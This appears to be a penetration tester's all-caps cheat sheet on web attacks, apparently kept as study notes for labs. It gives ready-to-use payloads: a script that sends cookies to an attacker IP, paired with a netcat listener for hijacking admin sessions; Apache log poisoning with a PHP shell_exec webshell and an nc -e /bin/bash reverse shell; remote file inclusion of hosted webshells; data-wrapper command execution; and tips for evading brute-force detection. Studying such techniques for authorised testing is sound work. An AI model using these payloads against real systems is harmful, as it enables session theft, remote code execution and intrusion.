>ADMIN CONSOLES:<<<<<
TRY DEFAULTS, TRY TO USE PREVIOUSLY ENUMERATED INFORMATION, MAYBE BRUTEFORCE BUT IT'S LOUD AND RISKY

>BURP SUITE INTRUDER:
CHECK FOR SET_SESSION AND TOKEN VALUES
USE PROXY TO GRAB A REQUEST AND SEND IT TO INTRUDER
THIS POPULATES THE FIELDS IN INTRUDER
POSITIONS DETERMINES WHERE PAYLOADS IN INTRUDER ARE SET, IF YOU DO NOT WANT A POSTION CHANGED UNMARK THE WEIRD S
YOU CAN USE THE S TO BEAT BRUTEFORCE DETECTION Y SETTING IT ON COOKIE VALUE, SET SESSION, AND TOKEN
YOU CAN SET THE ATTACK TYPE TO PITCHFORK
CLICK OPTIONS AND THEN ADD FOR A RECURSIVE GREP
RECURSIVE GREP CAN BE USED TO GRAB A FIELD FROM ONE RESPONSE AND PASTE IT INTO THE NEXT
SCROLL DOWN TO SET SESSION HIDDEN, AND CLICK AND SELECT THE VALUE WHICH WILL SET THE START AFTER AND END AT DELIMITER FIELDS
CLICK OK AND THEN GO TO INTRUDER>2>OPTIONS AND CLICK ADD TO DEFINE ANOTHER EXTRACT
SELECT CONTENTS OF THE TOKEN FIELD
CLICK OK
CLICK THE PAYLOADS TAB
SELECT RECURSIVE GREP FOR THE FIRST TWO
USE YOUR OPTIONS THAT AUTO-FILLED EARLIER

MAKE A THIRD PAYLOAD FOR THE PASSWORD VALUE, USE SIMPLE LIST
ADD COMMON PASSWORDS

SET PAYLOAD FOUR AS REVERSE GREP FOR TOKEN EXTRACT OF THE TOKEN VALUE AND SET IT FROM

THE FOUR POSITIONS SHOULD BE

>XSS:<<<<<<
CHECK FOR CHARACTERS LISTED IN THE BEGINNING OF THIS POST
COOKIE SNATCHIN:
WE CAN USE SOMETHING LIKE 
<script>new Image().src="http://YOUR.IP.ADD.HERE/dope.jpg?output="+document.cookie;</script>
AND OPEN A LISTENER
sudo nc -nvlp 80
TO STEAL AN AUTHENTICATION TOKEN, LIKE PHPESSID
AND USE COOKIE EDITOR TO ALTER OURS TO MATCH AN ADMINS COOKIE
THEN NAVIGATE TO /ADMIN.PHP OR THE ADMIN PORTAL
AND BAM, WE'RE AUTHENTICATED

ALSO CHECK BEEF FOR OTHER XSS TOOLS

>LFI:<<<<<

ALWAYS LOOK FOR FILE EXTENSIONS IN URL STRINGS FOR MEANS OF DIRECTORY TRAVERSAL
SOMETHING.php?file= IS NORMALLY A DEAD GIVEAWAY FOR LOCAL FILE INCLUSION TO BE TESTED

LFI CAN BE LEVERAGED A NUMBER OF WAYS
I HAVE CREATED A SIMPLE SCRIPT IN THE USEFULS SCRIPTS SECTION TO CHECK FOR A NUMBER OF FILES THAT CAN BE READ USING LFI 
CHECK IT OUT, COPY BOTH OF THE FILES INTO A NEW DIRECTORY AND RUN IT AGAINST THE TARGET, SORT BY SIZE AND IGNORE ANY 0 BYTE FILES

CONTAMINATING LOGS:

IF YOU HAVE A WAY TO READ APACHE LOGS OR OTHER LOGS THAT DOCUMENT CONNECTION INFORMATION, IF YOU CAN CONTAMINATE THEM WITH PHP
YOU SHOULD BE ABLE TO GET THE PHP TO EXECUTE USING AN LFI VULNERABILITY
FOR EXAMPLE FOR APACHE LOGS YOU COULD USE
nc -nv IPP.ADD.HE.RE 80
TO CONNECT TO THE APACHE SERVER WITH NETCAT AND THEN TYPE
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
AND DESPITE A BAD REQUEST RETURN, IT WILL BE WRITTEN TO THE LOG FILE
SO IF YOU WERE TO LEVERAGE THE LFI POINT AGAIN AND APPEND A COMMAND WITH &CMD= I.E.
http://IP.ADD.HE.RE/lfipage.php?file=/path/to/log/file&cmd=nc -nlvp UR.IP.ADD.HERE 3777 -e /bin/bash
YOU COULD FORWARD A BASH SHELL VIA A NETCAT LISTENER BACK TO YOURSELF WITH THE PRIVILEDGES OF THE WEB SERVER

>RFI:<<<<<

RFI (REMOTE FILE INCLUSION) IS ALOT LIKE LFI (LOCAL FILE INCLUSION), EXCEPT AS THE NAME IMPLIES YOU CAN ALSO LOAD REMOTELY HOSTED FILES
TO LEVERAGE THIS YOU CAN SPIN UP A WEBSERVER LIKE APACHE ON YOUR HOST MACHINE AND USE IT TO HOST MORE ELABORATE WEBSHELLS THAT YOU
CAN DIRECT MULTIPLE SERVERS WITH THE SAME VULNERABILITY TO
THE SYNTAX FOR EXPLOITING THIS VULN IS A LITTLE DIFFERENT OF COURSE I.E.
http://IP.ADD.HE.RE/lfipoint?file=http://YOUR.IP.ADD.HERE/hostedfile.php
OR
http://IP.ADD.HE.RE/lfipoint?file=http://YOUR.IP.ADD.HERE/hostedfile.txt&cmd=ipconfig
WEBSHELLS ARE LOCATED AT /usr/share/webshells

>PHP WRAPPERS:<<<
WE MIGHT ALSO WANT TO CHECK IF 
http://IP.ADD.HE.RE/lfipoint?file=data:text/plain,<?php echo shell_exec("ipconfig") ?>
WORKS IN SITUATIONS WHERE A FILE= OPERAND IS USED BUT WE DONT HAVE THE ABILITY TO LEVERAGE LFI OR RFI
"IPCONFIG" CAN OF COURSE BE CHANGED TO A COMMAND FOR STARTING A REVERSE SHELL
